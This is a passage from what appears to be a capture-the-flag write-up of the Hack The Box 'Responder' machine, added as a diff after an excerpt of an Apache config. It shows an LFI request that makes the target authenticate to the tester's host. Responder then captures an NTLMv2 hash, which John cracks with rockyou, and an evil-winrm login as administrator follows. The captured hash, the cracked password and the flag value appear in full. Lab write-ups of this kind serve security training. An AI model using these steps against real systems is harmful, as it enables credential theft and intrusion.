@@ -90,3 +90,56 @@ we can proof this for example by including the current httpd.conf file for the s
 ````
 # # This is the main Apache HTTP server configuration file. It contains the # configuration directives that give the server its instructions. # See for detailed information. # In particular, see # # for a discussion of each configuration directive. # # Do NOT simply read the instructions in here without understanding # what they do. They're here only as hints or reminders. If you are unsure # consult the online docs. You have been warned. ........   ......... RandomSeed connect builtin # XAMPP: We disable operating system specific optimizations for a listening # socket by the http protocol here. IE 64 bit make problems without this. AcceptFilter http none AcceptFilter https none # AJP13 Proxy Include "conf/extra/httpd-ajp.conf"
 ```
+before diving deeper here however i want to check out the other services running, since i for one havent heard of them yet.
+
+using the responder utillity and the local file inclusion vulnerability i was able to get a username and a HTLM hash:
+
+/index.php?page=10.10.14.81/o
+
+[SMB] NTLMv2-SSP Client   : ::ffff:10.129.47.47
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:ded15dabbee2f8d1:55C41DBE760B574DB7D51C6AA4B15141:0101000000000000807DE95B2851D80104CCB82C797198E90000000002000800320044004E00330001001E00570049004E002D00440034005A004600590033004D0034004F005900430004003400570049004E002D00440034005A004600590033004D0034004F00590043002E00320044004E0033002E004C004F00430041004C0003001400320044004E0033002E004C004F00430041004C0005001400320044004E0033002E004C004F00430041004C0007000800807DE95B2851D80106000400020000000800300030000000000000000100000000200000EA593445609530A34F6BDB47317D0B435D44EF9ECF807834F94D83AA54DBAA790A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000 
+
+
+lets try and crack this with john
+
+└─$ john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+badminton        (Administrator)     
+1g 0:00:00:00 DONE (2022-04-16 00:30) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+
+´badminton´
+
+
+lets use evil-winrm to try and connect
+
+evil-winrm -i 10.129.47.47 -u administrator -p badminton
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                               
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion               
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+
+nice we got a connection lets loook for the final flag
+
+```
+Directory: C:\users\mike\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/10/2022   4:50 AM             32 flag.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>  type /users/mike/desktop/flag.txt
+ea81b7afddd03efaa0945333ed147fac```
